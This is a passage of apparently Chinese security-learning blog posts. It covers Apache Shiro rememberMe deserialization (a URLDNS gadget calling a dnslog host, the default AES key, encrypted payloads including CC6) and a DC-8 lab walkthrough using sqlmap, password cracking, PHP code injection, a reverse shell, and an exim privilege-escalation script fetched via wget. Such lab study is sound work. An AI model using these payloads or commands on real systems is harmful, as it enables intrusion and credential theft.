<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class URLDNS &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://k9ddxg.dnslog.cn&quot;);</span><br><span class="line">        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        f.setAccessible(true); // 绕过Java语言权限控制检查的权限</span><br><span class="line">        f.set(url,123); // 设置hashcode的值为-1的其他任何数字</span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,123); // 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询</span><br><span class="line">        f.set(url,-1); // 将hashcode重新设置为-1，确保在反序列化成功触发</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = new FileOutputStream(&quot;./urldns.ser&quot;);</span><br><span class="line">            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);</span><br><span class="line"></span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = new FileInputStream(&quot;./urldns.ser&quot;);</span><br><span class="line">            ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里先使用URLDNS利用链生成一个利用payload，这里的url是在DNSlog生成的</p>
<p>然后通过AES加密脚本进行固定key加密</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.shiro.crypto.AesCipherService;</span><br><span class="line">import org.apache.shiro.codec.CodecSupport;</span><br><span class="line">import org.apache.shiro.util.ByteSource;</span><br><span class="line">import org.apache.shiro.codec.Base64;</span><br><span class="line">import org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line">import java.nio.file.FileSystems;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;d://urldns.ser&quot;));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HWChkU+6Uq102u6EwcmZwsXxpbfwTHYkfuRtp3s0xdfyYe3IVH/SV+937NDpl/PnifK3LrVG+dz4lhEgAiySHCi8zN4Ak7gD9JzMVqDhvUmgwy2nI6iEe2ayMsqNcyCUVjVlmX3cYLRLvGx+WjoCa7PQ5fPhjLMvTx7nr4hYv1UsWtIlRX5vLc0ywGvBPuc4ifnOI1CnSJd7QPBTv5PGkbWKlPySpQXKxcLPtr7EKpz+rvetwM70oRKISG1IBx4j/wRv6BOT6M40fMLBBLxXHf1NUgPYKnRyurTW4zAw0Qat0VUlRXpoO9NcMGYUmHqkrNuqP9bFpF4TJQUIoQD+OoznEpGXcBHvcfuVho7NUkAFt+emJwYiJXG7UGS8q6Lo7BkBvSQZPNBTfC89wRf/KE1u67LOY/IQIYlEdm9Ir7Mqd0uHfUuwdBTE8D1Y2GgXG7kiWVPNqWIjkS9XX015yA==</span><br></pre></td></tr></table></figure></div>

<p>启动环境抓包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912200050878.png"
                      alt="image-20230912200050878"
                ></p>
<p>将生成的rememberMe字段的值替换成我们攻击payload</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912200144016.png"
                      alt="image-20230912200144016"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912200157142.png"
                      alt="image-20230912200157142"
                ></p>
<p>然后我们在DNSLOG页面可以看到地址被成功解析了，说明这里存在反序列化漏洞，反序列化利于成功了。</p>
<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>其实通过上面的分析，我们已经能够理解尝试shiro反序列化的原因是因为固定key加密。反过来我们要想要对这个漏洞进行利用，需要知道key才行。</p>
<p>Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key。</p>
<p>我们上面只是通过URLDNS利用链对shiro反序列化这个漏洞进行了验证，但是并没有造成什么实质性的利用，后面将学习shiro配合我们前面学习CC链进行攻击利用。</p>
]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-8打靶记录</title>
    <url>/2023/10/13/DC-8%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>使用arp协议扫描网段存活主机</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013102205326.png"
                      alt="image-20231013102205326"
                ></p>
<p>发现目标主机ip 192.168.113.166</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.113.166</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013102331058.png"
                      alt="image-20231013102331058"
                ></p>
<p>根据端口扫描可以开放了22和80端口</p>
<h1 id="二、漏洞挖掘与利用"><a href="#二、漏洞挖掘与利用" class="headerlink" title="二、漏洞挖掘与利用"></a>二、漏洞挖掘与利用</h1><p>访问目标靶机对应的web服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013102519182.png"
                      alt="image-20231013102519182"
                ></p>
<p>对web服务功能进行测试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013102609658.png"
                      alt="image-20231013102609658"
                ></p>
<p>可以看到details对应着不同的nid</p>
<p>那么这里可能与数据库有交互，可能存在sql注入</p>
<p>测试sql注入</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013102709364.png"
                      alt="image-20231013102709364"
                ></p>
<p>使结果为假</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013102728131.png"
                      alt="image-20231013102728131"
                ></p>
<p>可以看到构造为真和为假结果是不一样的</p>
<p>这里存在sql注入</p>
<p>使用sqlmap进行漏洞利用</p>
<p>爆数据库</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap http://192.168.113.166/?nid=1 -dbs </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013102933115.png"
                      alt="image-20231013102933115"
                ></p>
<p>爆表名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap http://192.168.113.166/?nid=1 -D d7db -tables</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013103149465.png"
                      alt="image-20231013103149465"
                ></p>
<p>数据库中有一个users表</p>
<p>爆users表数据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap http://192.168.113.166/?nid=1 -D d7db -T users --dump</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013103357916.png"
                      alt="image-20231013103357916"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.113.166/?nid=1 --batch -D &quot;d7db&quot; -T &quot;users&quot; -C &quot;name,pass&quot; --dump</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013103455169.png"
                      alt="image-20231013103455169"
                ></p>
<p>这里密码是加密了</p>
<p>这里使用john进行解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013104407354.png"
                      alt="image-20231013104407354"
                ></p>
<p>但是只破解开了john的密码是turtle</p>
<p>然后就是找用户登录的页面了</p>
<p>这里通过dirsearch进行目录扫描</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013104725291.png"
                      alt="image-20231013104725291"
                ></p>
<p>发现了usr登录路由</p>
<p>使用我们获得的账号密码进行登录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013104807222.png"
                      alt="image-20231013104807222"
                ></p>
<p>成功登录</p>
<p>下面我们要找的就是能够进行php代码执行的地方</p>
<p>然后在contact us找到一个可以编辑php代码的地方</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013111141149.png"
                      alt="image-20231013111141149"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013111318359.png"
                      alt="image-20231013111318359"
                ></p>
<p>这里可以编辑php代码</p>
<p>我们这里先使用phpinfo测试代码是否会被执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013111353686.png"
                      alt="image-20231013111353686"
                ></p>
<p>输入信息提交</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013111406365.png"
                      alt="image-20231013111406365"
                ></p>
<p>可以看到代码执行成功了</p>
<p>那我们这里可以写入shell，拿下服务器权限</p>
<p>但是这里我们并不知道写入shell的路径</p>
<p>所以我们这里通过反弹shell拿下服务器权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013111530050.png"
                      alt="image-20231013111530050"
                ></p>
<p>kali开启监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013111548138.png"
                      alt="image-20231013111548138"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013111646930.png"
                      alt="image-20231013111646930"
                ></p>
<p>反弹shell成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure></div>

<p>输入命令进入交互模式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013111830274.png"
                      alt="image-20231013111830274"
                ></p>
<p>我们现在是普通用户权限</p>
<h1 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h1><p>要想拿下这台服务器就要进行提权</p>
<p>最常用的就是suid提权</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<p>使用find命令查找具有<strong>suid</strong>权限的命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013111952640.png"
                      alt="image-20231013111952640"
                ></p>
<p>我们可以看到exim4这个命令有s权限位</p>
<p>查看以学exim4版本</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013112720640.png"
                      alt="image-20231013112720640"
                ></p>
<p>可以看到是4.89的版本</p>
<p>使用searchsploit工具查找exim版本存在的漏洞</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013112901158.png"
                      alt="image-20231013112901158"
                ></p>
<p>将利于脚本下载到攻击机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013113238319.png"
                      alt="image-20231013113238319"
                ></p>
<p>然后我们要把脚本传到目标靶机上</p>
<p>这里再攻击机上面开一个web服务</p>
<p>通过wget命令将文件下载到目标靶机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013113324119.png"
                      alt="image-20231013113324119"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013113346767.png"
                      alt="image-20231013113346767"
                ></p>
<p>提升脚本权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013113434045.png"
                      alt="image-20231013113434045"
                ></p>
<p>执行脚本提升权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013113548959.png"
                      alt="image-20231013113548959"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013113608247.png"
                      alt="image-20231013113608247"
                ></p>
<p>可以看到成功提升到root权限</p>
]]></content>
      <tags>
        <tag>渗透-靶机-DC系列</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro反序列化打CC依赖</title>
    <url>/2023/10/17/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93CC%E4%BE%9D%E8%B5%96/</url>
    <content><![CDATA[<h1 id="shiro反序列化打CC依赖"><a href="#shiro反序列化打CC依赖" class="headerlink" title="shiro反序列化打CC依赖"></a>shiro反序列化打CC依赖</h1><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在前面分析shiro反序列化漏洞原理的时候，我们是使用了URLDNS这条利用链进行了测试，最终成功解析了DNS地址，验证了shiro的反序列化漏洞。但是URLDNS这条利用链只能验证存在反序列化漏洞，不能造成真正的危害。这个时候我们想到了前面分析的CC链，我们能不能尝试打CC链进行命令执行。</p>
<p>我们这里本地验证一下：</p>
<p>这里尝试打一下CC6</p>
<p>cc6payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">zVixg0JBrpiK2dg9A/aZeWdUQCGx46J5SLDy3x32GzhsfFetU6DiMHur17+g/HNUx3UCcw1oVWa5ycOFfJjYnblZWDFz2bHW5LM98vMOg+cPOJMTeUFB/gT8clNJypWF1hg6Kj3geBSKPkfxwmIyXzPNQIHi8YGz03XP8LiklkW1ezRc716wbtsiNubB1qgMeRcPb8GDBlmEcjYJ8sL6MEikI46pPxr6BdYjU7L7dHzNj5N/+ESHmSW/ruNbT/6FQ+9jsJpnV+UoUn2/xwFPv9iRfk/XUxUIORpJd09dZVUuBoWKy016rdCfAA5JidiQxOLS9t3g3EFlpet3XoqPQWz0/mPSFnnGp2tYlPKrHAIuUq+6Z+8TzUBSu0rpPLfL+yfQ4OSyYv9xACLS2wiOxnKqnSr1r6dCJ6r1PfPGIbiUDODgWj482U16Liug5m01rkN9lq31BWcC8T3SkRVL3P5SqyxywYNZQ3fiTKwFIm/i1lAZZl5w/gn7PR7a9tcYKgLXiYdW6Y5giymxcApmkt6Pzm6eYCORLkE7FPqlWA4xm8TV4IiFPH+guaatt20WD+aNOACKv0ar6zBYLLlsst9W0b+gqDRSQeOeNaLqXbJxCwhiw4Vp6Ix96lEZDx+ba7UwCRVXI3jiYexCJha5kf4BfKkEVmDe7DxmNQ47HIS+Z8avHrvoOYtnwl1SlNHPIutCGGWm8nYkITLhfzArj/vNggLw8GuiN7Kd8VB006eV+TbzWKy5uF1S4HjsvfmV2yryvpODStHfpAT9r3Gtq7vFu3tF6FtZIWKfy8/t1f6idBVJCyG0O4J3ITD2r/e8llHeQhLC+pXTDFkYXBLAdt0OGJXEeFa688w/wbQPimqQHPjm7FI8NmfTP+x/tnnKdEjZyu+XqGml4mq2bsGoBDoebi6PrJ1G91Bu0qIyuLTfIr9f8ViJlK9MyR2laff5TK+mIP9PFnJLXxz25ZgJct9m8f7GOMO4O95EBcIFaungzcos5cad0Q721gMZFas8i2RybHLiYFlfZsRugTsPD/WxVSCnXJiBzn3F0GOYJYuapBkmw8eyJDgXAJF2fmzFxhzSx0VFgatHUWRNeaR+Rz9OOP+DjltqAad4U42O1OndlVbR1sPkij88IOz35aTx//Rn7PLgW8oOV813gxOcPREnLbkHLjda2Ih+dxfPHzYpT5WLqA0dmlWDoAp838wGqw2dndj4hLz6wWtMEqWrsWBiqZEho/x1vaZVnjkJvY2CZz9LA3Fl2FKDbkTRgsyUm1C3HDxg8R+7LkREzVi/5DhnRioDPbrRmgqj7vjtpUIJZttuStkcDlndd1QKy3aGoLCYxwvoCPoB6nmtfKcYFppbd+F8JkqBR7aoXNPdyJdPwLzt8K3d3vMcVFrerVZJS8OLJC4E6NbCqi7abjOFw7QL2xL2VXECK2QA6nOUJ72nFgjHHXn0s1/FsIwKVd3LwT26PnT6RLMF4RpSdiYeo9TfytNiYkczgcIxihWRbEM+TDaZWBsoNtXj8GGx9BTEIQZquutgrnU9sLHeZdMC4A==</span><br></pre></td></tr></table></figure></div>

<p>替换掉rememberMe的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012093344169.png"
                      alt="image-20231012093344169"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017182018239.png"
                      alt="image-20231017182018239"
                ></p>
<p>可以看到当我们将替换了rememberMe的请求包发送给服务器，在服务器的日志中出现了报错</p>
<p>我们从日志中可以看到这里是反序列化失败了，反序列化失败的原因是找不到<code>Lorg.apache.commons.collections.Transformer</code>这个类。</p>
<h1 id="二、shiro无法正常打CC依赖分析"><a href="#二、shiro无法正常打CC依赖分析" class="headerlink" title="二、shiro无法正常打CC依赖分析"></a>二、shiro无法正常打CC依赖分析</h1><p>报错是在<code>ObjectInputStream</code></p>
<p>我们在这里打一个断点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012100008545.png"
                      alt="image-20231012100008545"
                ></p>
<p>重新发包，触发断点</p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012100123790.png"
                      alt="image-20231012100123790"
                ></p>
<p>可以看到<code>ClassResolvingObjectInputStream</code> 继承了ObjectInputStream</p>
<p>继续向下面看</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; catch (UnknownClassException e) &#123;</span><br><span class="line">            throw new ClassNotFoundException(&quot;Unable to load ObjectStreamClass [&quot; + osc + &quot;]: &quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到<code>ClassResolvingObjectInputStream</code> 还重写了<code>resolveClass</code>方法</p>
<p>在ObjectInputStream类中原本的resolveClass方法是：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012104851581.png"
                      alt="image-20231012104851581"
                ></p>
<p>在原本<code>ObjectInputStrem</code>中的返回的是Class.forName</p>
<p>但是在shiro重写的resolveClass方法中返回的却是<code>ClassUtils.forName</code></p>
<p>这里跟进到<code>ClassUtils.forName</code>方法</p>
<p>到这里我们可以看到最终是使用loadClass来加载类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012145606453.png"
                      alt="image-20231012145606453"
                ></p>
<p>在这里默认是使用的是<code>THREAD_CL_ACCESSOR.loadClass</code>来进行加载</p>
<p>如果加载不成功则会使用<code>CLASS_CL_ACCESSOR.loadClass</code>来进行加载</p>
<p>如果还是加载不成功则会使用<code>SYSTEM_CL_ACCESSOR.loadClass</code>来进行加载</p>
<p>THREAD_CL_ACCESSOR.loadClass返回当前线程上下面的ClassLoader</p>
<p>在Tomcat中间件中，返回的当前线程上下文的CLassLoader是<code>ParallelWebappClassLoader</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012145457072.png"
                      alt="image-20231012145457072"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013180035440.png"
                      alt="image-20231013180035440"
                ></p>
<p>可以看到这里获取到的加载器是ParallelWebappClassLoader</p>
<p>调用了loadclass方法进行加载</p>
<p>我们这里跟进到WebappClassLoaderBase类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013180610932.png"
                      alt="image-20231013180610932"
                ></p>
<p>我们可以看到webappCLassLoaderBase类继承于URLCLassLoader</p>
<p>loadclass是webappClassLoaderBase类加载的核心实现源码</p>
<p>其实到这里就是分析tomcat的类加载过程了</p>
<p>我们这里跟进到loadclass方法分析一下tomcat的类加载机制</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// (0) Check our previously loaded local class cache</span><br><span class="line">            clazz = findLoadedClass0(name);</span><br><span class="line">            if (clazz != null) &#123;</span><br><span class="line">                if (log.isDebugEnabled())</span><br><span class="line">                    log.debug(&quot;  Returning class from cache&quot;);</span><br><span class="line">                if (resolve)</span><br><span class="line">                    resolveClass(clazz);</span><br><span class="line">                return clazz;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // (0.1) Check our previously loaded class cache</span><br><span class="line">            clazz = findLoadedClass(name);</span><br><span class="line">            if (clazz != null) &#123;</span><br><span class="line">                if (log.isDebugEnabled())</span><br><span class="line">                    log.debug(&quot;  Returning class from cache&quot;);</span><br><span class="line">                if (resolve)</span><br><span class="line">                    resolveClass(clazz);</span><br><span class="line">                return clazz;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>根据loadclas的代码我们可以看到首先是调用 findLoadedClass0()方法检查之前加载的本地类缓存，即就是检查当前要加载的类是否已经被WebappClassLoader加载过。其实也就是从tomcat的缓存中找。</p>
<p>如果再本地类加载缓存中没有加载成功，则会调用findLoadedClass()方法检查系统类加载器的 cache 缓存中查找是否加载过。也就是从JDK缓存中找。</p>
<p>如果还是没有加载到</p>
<p>我们继续向下看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013191626160.png"
                      alt="image-20231013191626160"
                ></p>
<p>可以看到这里调用<code>getJavaseClassLoader()</code>获取一个类加载器<br>其实这里使用的也就是我们再动态加载字节码中分析的双亲委派机制的中的ExtClassLoader 但是这里不同的是Tomcat 的 WebAppClassLoader 并没有先使用 AppClassLoader 来加载类，而是直接使用了 ExtClassLoader 来加载类。不过 ExtClassLoader 依然遵循双亲委派，它会使用 Bootstrap ClassLoader 来对类进行加载，保证了 Jre 里面的核心类不会被重复加载。比如在 Web 中加载一个 Object 类。WebAppClassLoader → ExtClassLoader → BootstrapClassLoader，这个加载链，就保证了 Object 不会被重复加载。</p>
<p>然后我们继续往下面分析，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">boolean delegateLoad = delegate || filter(name, true);</span><br><span class="line"></span><br><span class="line">           // (1) Delegate to our parent if requested</span><br><span class="line">           if (delegateLoad) &#123;</span><br><span class="line">               if (log.isDebugEnabled())</span><br><span class="line">                   log.debug(&quot;  Delegating to parent classloader1 &quot; + parent);</span><br><span class="line">               try &#123;</span><br><span class="line">                   clazz = Class.forName(name, false, parent);</span><br><span class="line">                   if (clazz != null) &#123;</span><br><span class="line">                       if (log.isDebugEnabled())</span><br><span class="line">                           log.debug(&quot;  Loading class from parent&quot;);</span><br><span class="line">                       if (resolve)</span><br><span class="line">                           resolveClass(clazz);</span><br><span class="line">                       return clazz;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                   // Ignore</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           // (2) Search local repositories</span><br><span class="line">           if (log.isDebugEnabled())</span><br><span class="line">               log.debug(&quot;  Searching local repositories&quot;);</span><br><span class="line">           try &#123;</span><br><span class="line">               clazz = findClass(name);</span><br><span class="line">               if (clazz != null) &#123;</span><br><span class="line">                   if (log.isDebugEnabled())</span><br><span class="line">                       log.debug(&quot;  Loading class from local repository&quot;);</span><br><span class="line">                   if (resolve)</span><br><span class="line">                       resolveClass(clazz);</span><br><span class="line">                   return clazz;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">               // Ignore</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           // (3) Delegate to parent unconditionally</span><br><span class="line">           if (!delegateLoad) &#123;</span><br><span class="line">               if (log.isDebugEnabled())</span><br><span class="line">                   log.debug(&quot;  Delegating to parent classloader at end: &quot; + parent);</span><br><span class="line">               try &#123;</span><br><span class="line">                   clazz = Class.forName(name, false, parent);</span><br><span class="line">                   if (clazz != null) &#123;</span><br><span class="line">                       if (log.isDebugEnabled())</span><br><span class="line">                           log.debug(&quot;  Loading class from parent&quot;);</span><br><span class="line">                       if (resolve)</span><br><span class="line">                           resolveClass(clazz);</span><br><span class="line">                       return clazz;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                   // Ignore</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></div>

<p>通过代码我们可以分析到，如果前面都没有加载到，通过filter()检查类是否在定义的名单范围内，如果在的话则遵循双亲委派机制，使用Class.forName()加载类。由于delegate默认为false，并且符合filter()检查的类比较少，所以可以认为Tomcat在实现大多数类的加载的时候并不遵循双亲委派机制，也就是一般会跳过这一步。</p>
<p>也就是说</p>
